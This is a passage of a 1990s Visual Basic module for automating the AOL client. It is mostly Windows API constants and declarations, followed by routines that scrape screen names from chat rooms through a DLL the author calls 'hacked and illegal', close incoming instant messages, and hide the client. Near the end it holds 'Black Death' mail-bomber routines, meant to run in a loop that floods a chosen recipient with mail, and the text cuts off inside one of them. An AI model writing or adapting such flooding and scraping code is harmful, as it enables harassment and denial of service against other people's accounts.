Global Const META_DIBSTRETCHBLT = &HB41
Global Const META_DIBCREATEPATTERNBRUSH = &H142
Global Const META_STRETCHDIB = &HF43
Global Const META_DELETEOBJECT = &H1F0
Global Const META_CREATEPALETTE = &HF7
Global Const META_CREATEBRUSH = &HF8
Global Const META_CREATEPATTERNBRUSH = &H1F9
Global Const META_CREATEPENINDIRECT = &H2FA
Global Const META_CREATEFONTINDIRECT = &H2FB
Global Const META_CREATEBRUSHINDIRECT = &H2FC
Global Const META_CREATEBITMAPINDIRECT = &H2FD
Global Const META_CREATEBITMAP = &H6FE
Global Const META_CREATEREGION = &H6FF

'Escape
Global Const NEWFRAME = 1
Global Const ABORTDOCCONST = 2
Global Const NEXTBAND = 3
Global Const SETCOLORTABLE = 4
Global Const GETCOLORTABLE = 5
Global Const FLUSHOUTPUT = 6
Global Const DRAFTMODE = 7
Global Const QUERYESCSUPPORT = 8
Global Const SETABORTPROCCONST = 9
Global Const STARTDOCCONST = 10
Global Const ENDDOCAPICONST = 11
Global Const GETPHYSPAGESIZE = 12
Global Const GETPRINTINGOFFSET = 13
Global Const GETSCALINGFACTOR = 14
Global Const MFCOMMENT = 15
Global Const GETPENWIDTH = 16
Global Const SETCOPYCOUNT = 17
Global Const SELECTPAPERSOURCE = 18
Global Const DEVICEDATA = 19
Global Const PASSTHROUGH = 19
Global Const GETTECHNOLGY = 20
Global Const GETTECHNOLOGY = 20
Global Const SETENDCAP = 21
Global Const SETLINEJOIN = 22
Global Const SETMITERLIMIT = 23
Global Const BANDINFO = 24
Global Const DRAWPATTERNRECT = 25
Global Const GETVECTORPENSIZE = 26
Global Const GETVECTORBRUSHSIZE = 27
Global Const ENABLEDUPLEX = 28
Global Const GETSETPAPERBINS = 29
Global Const GETSETPRINTORIENT = 30
Global Const ENUMPAPERBINS = 31
Global Const SETDIBSCALING = 32
Global Const EPSPRINTING = 33
Global Const ENUMPAPERMETRICS = 34
Global Const GETSETPAPERMETRICS = 35
Global Const POSTSCRIPT_DATA = 37
Global Const POSTSCRIPT_IGNORE = 38
Global Const GETEXTENDEDTEXTMETRICS = 256
Global Const GETEXTENTTABLE = 257
Global Const GETPAIRKERNTABLE = 258
Global Const GETTRACKKERNTABLE = 259
Global Const EXTTEXTOUTCONST = 512
Global Const ENABLERELATIVEWIDTHS = 768
Global Const ENABLEPAIRKERNING = 769
Global Const SETKERNTRACK = 770
Global Const SETALLJUSTVALUES = 771
Global Const SETCHARSET = 772
Global Const STRETCHBLTCONST = 2048
Global Const BEGIN_PATH = 4096
Global Const CLIP_TO_PATH = 4097
Global Const END_PATH = 4098
Global Const EXT_DEVICE_CAPS = 4099
Global Const RESTORE_CTM = 4100
Global Const SAVE_CTM = 4101
Global Const SET_ARC_DIRECTION = 4102
Global Const SET_BACKGROUND_COLOR = 4103
Global Const SET_POLY_MODE = 4104
Global Const SET_SCREEN_ANGLE = 4105
Global Const SET_SPREAD = 4106
Global Const TRANSFORM_CTM = 4107
Global Const SET_CLIP_BOX = 4108
Global Const SET_BOUNDS = 4109
Global Const SET_MIRROR_MODE = 4110

'Spooler Error Codes
Global Const SP_NOTREPORTED = &H4000
Global Const SP_ERROR = (-1)
Global Const SP_APPABORT = (-2)
Global Const SP_USERABORT = (-3)
Global Const SP_OUTOFDISK = (-4)
Global Const SP_OUTOFMEMORY = (-5)
Global Const PR_JOBSTATUS = &H0

'biCompression field constants for DIB
Global Const BI_RGB = 0&
Global Const BI_RLE8 = 1&
Global Const BI_RLE4 = 2&

'LOGFONT and TEXTMETRIC
Global Const OUT_DEFAULT_PRECIS = 0
Global Const OUT_STRING_PRECIS = 1
Global Const OUT_CHARACTER_PRECIS = 2
Global Const OUT_STROKE_PRECIS = 3
Global Const OUT_TT_PRECIS = 4
Global Const OUT_DEVICE_PRECIS = 5
Global Const OUT_RASTER_PRECIS = 6
Global Const OUT_TT_ONLY_PRECIS = 7
Global Const CLIP_DEFAULT_PRECIS = 0
Global Const CLIP_CHARACTER_PRECIS = 1
Global Const CLIP_STROKE_PRECIS = 2
Global Const CLIP_LH_ANGLES = &H10
Global Const CLIP_TT_ALWAYS = &H20
Global Const CLIP_EMBEDDED = &H80
Global Const DEFAULT_QUALITY = 0
Global Const DRAFT_QUALITY = 1
Global Const PROOF_QUALITY = 2
Global Const DEFAULT_PITCH = 0
Global Const FIXED_PITCH = 1
Global Const VARIABLE_PITCH = 2
Global Const TMPF_FIXED_PITCH = 1
Global Const TMPF_VECTOR = 2
Global Const TMPF_DEVICE = 8
Global Const TMPF_TRUETYPE = 4
Global Const ANSI_CHARSET = 0
Global Const DEFAULT_CHARSET = 1
Global Const SYMBOL_CHARSET = 2
Global Const SHIFTJIS_CHARSET = 128
Global Const OEM_CHARSET = 255
Global Const NTM_REGULAR = &H40&
Global Const NTM_BOLD = &H20&
Global Const NTM_ITALIC = &H1&
Global Const LF_FULLFACESIZE = 64
Global Const RASTER_FONTTYPE = 1
Global Const DEVICE_FONTTYPE = 2
Global Const TRUETYPE_FONTTYPE = 4


'Font Families
Global Const FF_DONTCARE = 0
Global Const FF_ROMAN = 16

'Times Roman, Century Schoolbook, etc.
Global Const FF_SWISS = 32

' Helvetica, Swiss, etc.
Global Const FF_MODERN = 48

' Pica, Elite, Courier, etc.
Global Const FF_SCRIPT = 64
Global Const FF_DECORATIVE = 80

'Font Weights
Global Const FW_DONTCARE = 0
Global Const FW_THIN = 100
Global Const FW_EXTRALIGHT = 200
Global Const FW_LIGHT = 300
Global Const FW_NORMAL = 400
Global Const FW_MEDIUM = 500
Global Const FW_SEMIBOLD = 600
Global Const FW_BOLD = 700
Global Const FW_EXTRABOLD = 800
Global Const FW_HEAVY = 900
Global Const FW_ULTRALIGHT = FW_EXTRALIGHT
Global Const FW_REGULAR = FW_NORMAL
Global Const FW_DEMIBOLD = FW_SEMIBOLD
Global Const FW_ULTRABOLD = FW_EXTRABOLD
Global Const FW_BLACK = FW_HEAVY

'Background Modes
Global Const Transparent = 1
Global Const OPAQUE = 2

'Mapping Modes
Global Const MM_TEXT = 1
Global Const MM_LOMETRIC = 2
Global Const MM_HIMETRIC = 3
Global Const MM_LOENGLISH = 4
Global Const MM_HIENGLISH = 5
Global Const MM_TWIPS = 6
Global Const MM_ISOTROPIC = 7
Global Const MM_ANISOTROPIC = 8

'Coordinate Modes
Global Const ABSOLUTE = 1
Global Const RELATIVE = 2

'Stock Logical Objects
Global Const WHITE_BRUSH = 0
Global Const LTGRAY_BRUSH = 1
Global Const GRAY_BRUSH = 2
Global Const DKGRAY_BRUSH = 3
Global Const BLACK_BRUSH = 4
Global Const NULL_BRUSH = 5
Global Const HOLLOW_BRUSH = NULL_BRUSH
Global Const WHITE_PEN = 6
Global Const BLACK_PEN = 7
Global Const NULL_PEN = 8
Global Const OEM_FIXED_FONT = 10
Global Const ANSI_FIXED_FONT = 11
Global Const ANSI_VAR_FONT = 12
Global Const SYSTEM_FONT = 13
Global Const DEVICE_DEFAULT_FONT = 14
Global Const DEFAULT_PALETTE = 15
Global Const SYSTEM_FIXED_FONT = 16

'Brush Styles
Global Const BS_SOLID = 0
Global Const BS_NULL = 1
Global Const BS_HOLLOW = BS_NULL
Global Const BS_HATCHED = 2
Global Const BS_PATTERN = 3
Global Const BS_INDEXED = 4
Global Const BS_DIBPATTERN = 5

'Hatch Styles
Global Const HS_HORIZONTAL = 0
Global Const HS_VERTICAL = 1
Global Const HS_FDIAGONAL = 2
Global Const HS_BDIAGONAL = 3
Global Const HS_CROSS = 4
Global Const HS_DIAGCROSS = 5

'Pen Styles
Global Const PS_SOLID = 0
Global Const PS_DASH = 1
Global Const PS_DOT = 2
Global Const PS_DASHDOT = 3
Global Const PS_DASHDOTDOT = 4
Global Const PS_NULL = 5
Global Const MF_Popup = &H10
Global Const PS_INSIDEFRAME = 6

'Bounds Rectangle Constants
Global Const DCB_RESET = 1
Global Const DCB_ACCUMULATE = 2
Global Const DCB_DIRTY = 2
Global Const DCB_SET = 3
Global Const DCB_ENABLE = 4
Global Const DCB_DISABLE = 8

'GetDeviceCaps() Device Parameters
Global Const DRIVERVERSION = 0
Global Const TECHNOLOGY = 2
Global Const HORZSIZE = 4
Global Const VERTSIZE = 6
Global Const HORZRES = 8
Global Const VERTRES = 10
Global Const BITSPIXEL = 12
Global Const PLANES = 14
Global Const NUMBRUSHES = 16
Global Const NUMPENS = 18
Global Const NUMMARKERS = 20
Global Const NUMFONTS = 22
Global Const NUMCOLORS = 24
Global Const PDEVICESIZE = 26
Global Const CURVECAPS = 28
Global Const LINECAPS = 30
Global Const POLYGONALCAPS = 32
Global Const TEXTCAPS = 34
Global Const CLIPCAPS = 36
Global Const RASTERCAPS = 38
Global Const ASPECTX = 40
Global Const ASPECTY = 42
Global Const ASPECTXY = 44
Global Const LOGPIXELSX = 88
Global Const LOGPIXELSY = 90
Global Const SIZEPALETTE = 104
Global Const NUMRESERVED = 106
Global Const COLORRES = 108
Declare Sub UpdateWindow Lib "User" (ByVal hWnd%)
Declare Sub GetWindowRect Lib "User" (ByVal hWnd As Integer, lpRect As RECT)
Declare Function ReleaseDC Lib "User" (ByVal hWnd%, ByVal hDC%) As Integer
Declare Function GetWindowDC Lib "User" (ByVal hWnd As Integer) As Integer
Declare Function SelectObject Lib "GDI" (ByVal hDC As Integer, ByVal hObject As Integer) As Integer
Declare Function CreateSolidBrush Lib "GDI" (ByVal crColor As Long) As Integer
Declare Function GetDC Lib "User" (ByVal hWnd%) As Integer
Declare Function GetFocus% Lib "User" ()
Declare Sub GetScrollRange Lib "User" (ByVal hWnd As Integer, ByVal nBar As Integer, Lpminpos As Integer, lpmaxpos As Integer)
Declare Function getcurrenttime& Lib "User" ()
Global Const WM_LBUTTONDOWN = &H201
Global Const WM_LBUTTONUP = &H202
Declare Function destroywindow Lib "User" (ByVal hWnd As Integer) As Integer
Declare Sub closewindow Lib "User" (ByVal hWnd As Integer)
Declare Function GetMenuItemCount Lib "User" (ByVal hMenu As Integer) As Integer
Declare Function GetMenuString Lib "User" (ByVal hMenu As Integer, ByVal wIDItem As Integer, ByVal LcaseString As String, ByVal nMaxCount As Integer, ByVal wFlag As Integer) As Integer
Declare Function SetFocusAPI% Lib "User" Alias "SetFocus" (ByVal hWnd As Integer)
Declare Function GetMenuItemID Lib "User" (ByVal hMenu As Integer, ByVal nPos As Integer) As Integer
Declare Function GetSubMenu Lib "User" (ByVal hMenu As Integer, ByVal nPos As Integer) As Integer
Declare Function test Lib "APIGuide.Dll" Alias "AgGetStringFromLPSTR" (ByVal p1&) As String
Declare Function Getmenu Lib "User" (ByVal hWnd As Integer) As Integer
Declare Function SetWindowPos Lib "user" (ByVal h%, ByVal hb%, ByVal x%, ByVal y%, ByVal cx%, ByVal cy%, ByVal F%) As Integer
Global Const WM_MButtondown = &H207
Global Const WM_MButtonup = &H208
Global Const GW_HWNDNEXT = 2
Global Const WM_GETTEXTLENGTH = &HE
Global Const WM_COMMAND = &H111
Global Const WM_CHAR = &H102
Global Const WM_GETTEXT = &HD
Global Const WM_SETTEXT = &HC
Global Const SWP_NOMOVE = 2
Global Const SWP_NOSIZE = 1
Global Const Flags = SWP_NOMOVE Or SWP_NOSIZE
Global Const HWND_TOPMOST = -1
Global Const HWND_NOTOPMOST = -2
Declare Function GetWindow Lib "User" (ByVal hWnd As Integer, ByVal wCmd As Integer) As Integer
Declare Function SendMessage Lib "User" (ByVal hWnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer, lParam As Any) As Long
Declare Function sendmessagebynum& Lib "User" Alias "SendMessage" (ByVal hWnd%, ByVal wMsg%, ByVal wParam%, ByVal lParam&)
Declare Function sendmessagebystring& Lib "User" Alias "SendMessage" (ByVal hWnd%, ByVal wMsg%, ByVal wParam%, ByVal lParam$)
Declare Function DeleteBubble% Lib "bubble.dll" (ByVal wnd%)
Declare Function findchildbytitle% Lib "vbwfind.dll" (ByVal Parent%, ByVal Title$)
Declare Function findchildbyclass% Lib "vbwfind.dll" (ByVal Parent%, ByVal Title$)
Declare Function AOLGetList% Lib "311.Dll" (ByVal Index%, ByVal Buf$)
Declare Function findwindow Lib "User" (ByVal lpClassName As Any, ByVal lpWindowName As Any) As Integer
Declare Function getparent Lib "User" (ByVal hWnd As Integer) As Integer
Declare Function AOLGetcombo% Lib "311.Dll" (ByVal Index%, ByVal Buf$)

Declare Sub getcursorpos Lib "User" (lpPoint As POINTAPI)

Sub ADD_AOL_LB (itm As String, Lst As ListBox)
'Add a list of names to a VB ListBox
'This is usually called by another one of my functions

If Lst.ListCount = 0 Then
Lst.AddItem itm
Exit Sub
End If
Do Until xx = (Lst.ListCount)
Let diss_itm$ = Lst.List(xx)
If Trim(LCase(diss_itm$)) = Trim(LCase(itm)) Then Let do_it = "NO"
Let xx = xx + 1
Loop
If do_it = "NO" Then Exit Sub
Lst.AddItem itm
End Sub

Sub AddCombo (combo As ComboBox, txt$)
For x = 0 To combo.ListCount - 1
    If RemoveSpace(UCase$(combo.List(x))) = RemoveSpace(UCase$(txt$)) Then Exit Sub
Next
If txt$ = "" Then Exit Sub
combo.AddItem txt$
End Sub

Sub Addlist (combo As ListBox, txt$)
For x = 0 To combo.ListCount - 1
    If RemoveSpace(UCase$(combo.List(x))) = RemoveSpace(UCase$(txt$)) Then Exit Sub
Next
If txt$ = "" Then Exit Sub
combo.AddItem txt$
End Sub

Sub Addroom (Lst As ListBox)
'This calls a function in 311.dll that retreives the names
'from the AOL listbox.
'PLEASE NOTE THE FOLLOWING:
'1)  I don't support this dll..its hacked and illegal
'2)  This only works on 16 bit versions of AOL
'3)  Its a good idea to bring the chat room to the top
'    of the AOL client before doing this.  Sometimes it
'    gets text from other AOL listboxes


For Index% = 0 To 25
NAMEZ$ = String$(256, " ")
Ret = AOLGetList(Index%, NAMEZ$) & ErB$
If Len(Trim$(NAMEZ$)) <= 1 Then GoTo end_addr
NAMEZ$ = Left$(Trim$(NAMEZ$), Len(Trim(NAMEZ$)) - 1)

ADD_AOL_LB NAMEZ$, Lst
Next Index%
end_addr:

End Sub

Sub addroomcombo (combo As ComboBox)
On Error Resume Next
Chat% = findchatroom()
AolList% = findchildbyclass(Chat%, "_AOL_ListBox")
Num = sendmessagebynum(AolList%, LB_GETCOUNT, 0, 0)
x = SetFocusAPI(Chat%)
For i% = 0 To Num - 1
    DoEvents
    NAMEZ$ = String$(256, " ")
    Ret = AOLGetList(i%, NAMEZ$)
    NAMEZ$ = Trim$(NAMEZ$)
    SN$ = UserSN()
    NAMEZ$ = Trim$(Mid$(NAMEZ$, 1, Len(NAMEZ$) - 1))
    If Trim$(UCase$(NAMEZ$)) = Trim$(UCase(SN$)) Then GoTo onn2
    Call AddCombo(combo, NAMEZ$)
     combo.ListIndex = 0
onn2:
Next

End Sub

Sub addroomlist (combo As ListBox)
On Error Resume Next
Chat% = findchatroom()
AolList% = findchildbyclass(Chat%, "_AOL_ListBox")
Num = sendmessagebynum(AolList%, LB_GETCOUNT, 0, 0)
x = SetFocusAPI(Chat%)
For i% = 0 To Num - 1
    DoEvents
    NAMEZ$ = String$(256, " ")
    Ret = AOLGetList(i%, NAMEZ$)
    NAMEZ$ = Trim$(NAMEZ$)
    SN$ = UserSN()
    NAMEZ$ = Trim$(Mid$(NAMEZ$, 1, Len(NAMEZ$) - 1))
    If Trim$(UCase$(NAMEZ$)) = Trim$(UCase(SN$)) Then GoTo ACC
    Call Addlist(combo, NAMEZ$)
     combo.ListIndex = 0
ACC:
Next

End Sub

Sub addroomtext (peopleon As TextBox)
buffa$ = String$(255, 0)
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
EDT% = findchildbyclass(findchatroom(), "_AOL_Edit")
If EDT% = 0 Then Exit Sub
SN$ = UserSN() & ", "

For Index% = 0 To 25: DoEvents
NAMEZ$ = String$(256, " ")
Ret = AOLGetList(Index%, NAMEZ$) & ErB$
If Len(Trim$(NAMEZ$)) <= 1 Then Exit For
NAMEZ$ = Left$(Trim$(NAMEZ$), Len(Trim(NAMEZ$)) - 1)
If InStr(peopleon.Text, NAMEZ$) Then GoTo NxTZ1
If NAMEZ$ = UserSN() Then GoTo NxTZ1
peopleon.Text = peopleon.Text & "(" & NAMEZ$ & "), "
peopleon.SelStart = Len(peopleon.Text)
NxTZ1:
Next Index%

End Sub

Sub addroomtext2 (List As ListBox, Text As TextBox)
addroomlist List
For i = 0 To List.ListCount - 1
names = List.List(i)
Text.Text = Text.Text + names + ", "
Next i
End Sub

Sub alive (who As String)
AOL% = findwindow("AOL Frame25", 0&)
Call aolsendmail(who$, "SUP", "SUP")
Do
DoEvents
ErrorWindow% = findchildbytitle(AOL%, "Error")
Loop Until ErrorWindow% <> 0
View% = findchildbyclass(ErrorWindow%, "_AOL_View")
timeout (2)
'ViewText$ = GetAPIText(View%)
If UCase$(ViewText$) Like UCase$("*" & who$ & "*") Then
    If InStr(RemoveSpace(UCase$(ViewText$)), RemoveSpace(UCase$(who$))) Then Alives = False
Else :
    Alives = True
End If
Call CloseWin(ErrorWindow%)
Compose% = findchildbytitle(AOL%, "Compose Mail")
Call CloseWin(Compose%)
End Sub

Sub antipunta ()
a = findwindow("AOL Frame25", 0&)
b = findchildbytitle(a, ">Instant Message From: ")
CloseWin (b)
End Sub

Sub antipuntb ()
a = findwindow("AOL Frame25", 0&)
b = findchildbytitle(a, ">Instant Message From: ")
c = findchildbyclass(b, "RICHCNTL")
CloseWin (c)
a = findwindow("AOL Frame25", 0&)
b = findchildbytitle(a, ">Instant Message From: ")
c = findchildbyclass(b, "_AOL_View")
CloseWin (c)
End Sub

Sub AOL_AddRoomCombo (combo As ComboBox)
On Error Resume Next
Chat% = findchatroom()
AolList% = findchildbyclass(Chat%, "_AOL_ListBox")
Num = sendmessagebynum(AolList%, LB_GETCOUNT, 0, 0)
x = SetFocusAPI(Chat%)
For i% = 0 To Num - 1
    DoEvents
    NAMEZ$ = String$(256, " ")
    Ret = AOLGetList(i%, NAMEZ$)
    NAMEZ$ = Trim$(NAMEZ$)
    SN$ = UserSN()
    NAMEZ$ = Trim$(Mid$(NAMEZ$, 1, Len(NAMEZ$) - 1))
    If Trim$(UCase$(NAMEZ$)) = Trim$(UCase(SN$)) Then GoTo ACA
  
     combo.ListIndex = 0
ACA:
Next
End Sub

Sub AOL_AddRoomList (combo As ListBox)
On Error Resume Next
Chat% = findchatroom()
AolList% = findchildbyclass(Chat%, "_AOL_ListBox")
Num = sendmessagebynum(AolList%, LB_GETCOUNT, 0, 0)
x = SetFocusAPI(Chat%)
For i% = 0 To Num - 1
    DoEvents
    NAMEZ$ = String$(256, " ")
    Ret = AOLGetList(i%, NAMEZ$)
    NAMEZ$ = Trim$(NAMEZ$)
    SN$ = UserSN()
    NAMEZ$ = Trim$(Mid$(NAMEZ$, 1, Len(NAMEZ$) - 1))
    If Trim$(UCase$(NAMEZ$)) = Trim$(UCase(SN$)) Then GoTo ACV
    Call Addlist(combo, NAMEZ$)
     combo.ListIndex = 0

ACV:
Next
End Sub

Sub AOL_AddRoomText (peopleon As TextBox)
buffa$ = String$(255, 0)
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
EDT% = findchildbyclass(findchatroom(), "_AOL_Edit")
If EDT% = 0 Then Exit Sub
SN$ = UserSN() & ", "

For Index% = 0 To 25: DoEvents
NAMEZ$ = String$(256, " ")
Ret = AOLGetList(Index%, NAMEZ$) & ErB$
If Len(Trim$(NAMEZ$)) <= 1 Then Exit For
NAMEZ$ = Left$(Trim$(NAMEZ$), Len(Trim(NAMEZ$)) - 1)
If InStr(peopleon.Text, NAMEZ$) Then GoTo NxTZ11
If NAMEZ$ = UserSN() Then GoTo NxTZ11
peopleon.Text = peopleon.Text & "(" & NAMEZ$ & "), "
peopleon.SelStart = Len(peopleon.Text)
NxTZ11:
Next Index%

End Sub

Sub AOL_Available (who)
aolver = AOLVersion()
If aolver = 30 Then
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "Send an Instant Message")'Run Menu
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
to_who = who
c = sendmessagebystring(b, WM_SETTEXT, 0, to_who)
            
b = findchildbyclass(x, "RICHCNTL") 'Find msg area
What = ""
c = sendmessagebystring(b, WM_SETTEXT, 0, What) 'Put msg in



d = findchildbyclass(x, "_AOL_ICON")  'Find one of the
            'buttons
e = getnextwindow(d, 2) 'Next Button
F = getnextwindow(e, 2) 'Next
g = getnextwindow(F, 2) '
h = getnextwindow(g, 2) '
i = getnextwindow(h, 2) '
j = getnextwindow(i, 2) '
k = getnextwindow(j, 2) '
L = getnextwindow(k, 2) '
M = getnextwindow(L, 2) '
n = getnextwindow(M, 2) '
x = sendmessagebynum(n, WM_LBUTTONDOWN, 0, 0&) 'Click send
x = sendmessagebynum(n, WM_LBUTTONUP, 0, 0&)
    Off% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Off%, WM_CLOSE, 0, 0)
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)
Exit Sub
End If
If aolver = 25 Then
Call Available25(who)
Exit Sub
End If

End Sub

Sub AOL_Click (E1 As Integer)
'Clicks an AOL button with the given handle as E1

Exit Sub


do_wn = sendmessagebynum(E1, WM_LBUTTONDOWN, 0, 0&)
pause .008
u_p = sendmessagebynum(E1, WM_LBUTTONUP, 0, 0&)

End Sub

Sub AOL_CloseMailError ()
Do
DoEvents
a = findwindow("AOL Frame25", 0&)  'Find AOL
bye = findchildbytitle(a, "Error") 'Find IM
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)
Loop Until a <> 0

End Sub

Sub AOL_CloseMsg ()
Do
DoEvents
    Off% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Off%, WM_CLOSE, 0, 0)
Loop Until Off% <> 0

End Sub

Sub AOL_CloseWin (HAN)
Dim XZ
XZ = SendMessage(HAN, WM_CLOSE, 0, 0)
End Sub

Sub AOL_DisableWin ()
Dim bb As Integer
Dim dis_win As Integer
CessPit = enablewindow(aolhwnd(), 0)
fc = findchildbyclass(aolhwnd(), "AOL Child")
req = enablewindow(fc, 1)
faa = fc
Do
DoEvents
Let faf = faa
faa = getnextwindow(faa, 2)
res = enablewindow(faa, 1)
DoEvents
Loop Until faf = faa

End Sub

Sub AOL_EnableWin ()
Dim bb As Integer
Dim dis_win As Integer
CessPit = enablewindow(aolhwnd(), 1)
fc = findchildbyclass(aolhwnd(), "AOL Child")
req = enablewindow(fc, 1)
faa = fc
Do
DoEvents
Let faf = faa
faa = getnextwindow(faa, 2)
res = enablewindow(faa, 1)
DoEvents
Loop Until faf = faa

End Sub

Sub AOL_ErrorMsg ()
MsgBox "Error : Not Signed On!", 30
End Sub

Sub AOL_Exit ()
a = findwindow("AOL_Frame25", 0&)
b = findchildbytitle(a, "America  Online")
CloseWin (b)
End Sub

Sub AOL_HideAOL ()
a = findwindow("AOL Frame25", 0&)
    x = ShowWindow(a, SW_Hide)

End Sub

Sub AOL_IMOff ()
a = "$im_on"
b = " "
Sendim a, b

End Sub

Sub AOL_IMOn ()
a = "$im_on"
b = " "
Sendim a, b
End Sub

Sub AOL_Invoke (txt)
a = findwindow("AOL Frame25", 0&)  'Find the AOL Window
Call RunMenuByString(a, "Invoke Database Record...") 'Our RunMenu Function
Do: DoEvents                          'this loads the KW screen.
x = findchildbytitle(a, "Invoke Database Record")    'Find the KW Screen.
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT")  'Find the edit screen to
                'place the Keyword in.
kw = txt
c = sendmessagebystring(b, WM_SETTEXT, 0, kw) 'Put our KW in.
d = findchildbyclass(x, "_AOL_BUTTON_")        'Find the GO Button.
d = findchildbytitle(x, "OK")
e = sendmessagebynum(d, WM_LBUTTONDOWN, 0, 0&) 'Down click
pause .5
e = sendmessagebynum(d, WM_LBUTTONUP, 0, 0&)   'Up Click
subcd0 (.2)
z = sendmessagebynum(x, WM_CLOSE, 0, 0)

End Sub

Sub AOL_Keyword (txt)
If Online() = False Then : MsgBox "You Are Not Currectly Signed On To Your America Online Client", 59: Exit Sub
a = findwindow("AOL Frame25", 0&)  'Find the AOL Window
Call RunMenuByString(a, "Keyword...") 'Our RunMenu Function
Do: DoEvents                          'this loads the KW screen.
x = findchildbytitle(a, "Keyword")    'Find the KW Screen.
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT")  'Find the edit screen to
                'place the Keyword in.
kw = txt
c = sendmessagebystring(b, WM_SETTEXT, 0, kw) 'Put our KW in.
d = findchildbyclass(x, "_AOL_ICON")        'Find the GO Button.
e = sendmessagebynum(d, WM_LBUTTONDOWN, 0, 0&) 'Down click
pause .5
e = sendmessagebynum(d, WM_LBUTTONUP, 0, 0&)   'Up Click

End Sub

Sub AOL_LoadAOL ()
On Error Resume Next
Dim x
x = Shell("C:\aol30\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
x = Shell("C:\aol30a\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
x = Shell("C:\aol30b\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
x = Shell("C:\aol25\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
x = Shell("C:\aol25a\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
x = Shell("C:\aol25b\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub

End Sub

Sub AOL_Locate (who)
a = findwindow("AOL Frame25", 0&)  'Find the AOL Window
Call RunMenuByString(a, "Locate a Member Online") 'Our RunMenu Function
Do: DoEvents                          'this loads the KW screen.
x = findchildbytitle(a, "Locate Member Online")    'Find the KW Screen.
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT")  'Find the edit screen to
                'place the Keyword in.
kw = who
c = sendmessagebystring(b, WM_SETTEXT, 0, kw) 'Put our KW in.
d = findchildbyclass(x, "_AOL_BUTTON_")        'Find the GO Button.
d = findchildbytitle(x, "OK")
e = sendmessagebynum(d, WM_LBUTTONDOWN, 0, 0&) 'Down click
pause .5
e = sendmessagebynum(d, WM_LBUTTONUP, 0, 0&)   'Up Click
subcd0 (.2)
z = sendmessagebynum(x, WM_CLOSE, 0, 0)

End Sub

Sub AOL_MacroScroll (Macro)
Let Text$ = Macro
 Let curtxt$ = " "
 For n% = 1 To Len(Macro) + 1
  Let cur$ = Mid(Text$, n%, 1)
  If cur$ = Chr(13) Then
   Call sendroom(curtxt$): Call timeout(.5)
   Let curtxt$ = " "
  Else
   Let curtxt$ = curtxt$ + cur$
  End If
 Next n%

End Sub

Sub AOL_MailBomb ()
'Start's Mail Bomb
AOL% = findwindow("AOL Frame25", 0&)
Call RunMenuByString(AOL%, "Compose Mail")
'Regular Bomb-
'AOL_MailBomb: Do:DoEvents:AOL_MailBombT1 "Who", "Subject":Loop
'-------------
'Wave Bomb-
'AOL_MailBomb: Do:DoEvents:AOL_MailBombT2 "Who", "Subject":Loop
'-------------
'Spiral Bomb-
'AOL_MailBomb: Do:DoEvents:AOL_MailBombT3 "Who", "Subject":Loop
'-------------

End Sub

Sub AOL_MailBombT1 (who, subject)
msg = msg & "•••··· BD [ultra] v¹·º [ Black Death Mail Bomber" & KeyEnter()
msg = msg & "•••··· BD [ultra] v¹·º [ You are being mail bombed at " & gettime() & KeyEnter()
msg = msg & "•••··· BD [ultra] v¹·º [ You are being mail bombed on " & Date & KeyEnter()
msg = msg & "•••··· BD [ultra] v¹·º [ You are being mail bombed by " & UserSN() & KeyEnter()

MDI% = findchildbyclass(AOL_Window(), "MDIClient")
mailwin% = findchildbytitle(MDI%, "Compose Mail")
icone% = findchildbyclass(mailwin%, "_AOL_Icon")
peepz% = findchildbyclass(mailwin%, "_AOL_Edit")
subjt% = findchildbytitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
Mess% = findchildbyclass(mailwin%, "RICHCNTL")

a = sendmessagebystring(peepz%, WM_SETTEXT, 0, who)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, subject)
a = sendmessagebystring(Mess%, WM_SETTEXT, 0, msg)
b% = findchildbyclass(mailwin%, "_AOL_ICON")
timeout (.1)
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
End Sub

Sub AOL_MailBombT2 (who, subject)
msg = msg & "•••··· BD [ultra] v¹·º [ Black Death Mail Bomber" & KeyEnter()
msg = msg & "•••··· BD [ultra] v¹·º [ You are being mail bombed at " & gettime() & KeyEnter()
msg = msg & "•••··· BD [ultra] v¹·º [ You are being mail bombed on " & Date & KeyEnter()
msg = msg & "•••··· BD [ultra] v¹·º [ You are being mail bombed by " & UserSN() & KeyEnter()

MDI% = findchildbyclass(AOL_Window(), "MDIClient")
mailwin% = findchildbytitle(MDI%, "Compose Mail")
icone% = findchildbyclass(mailwin%, "_AOL_Icon")
peepz% = findchildbyclass(mailwin%, "_AOL_Edit")
subjt% = findchildbytitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
Mess% = findchildbyclass(mailwin%, "RICHCNTL")

a = sendmessagebystring(peepz%, WM_SETTEXT, 0, who)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, "" + subject)
a = sendmessagebystring(Mess%, WM_SETTEXT, 0, msg)
b% = findchildbyclass(mailwin%, "_AOL_ICON")
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, " " + subject): timeout .1
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
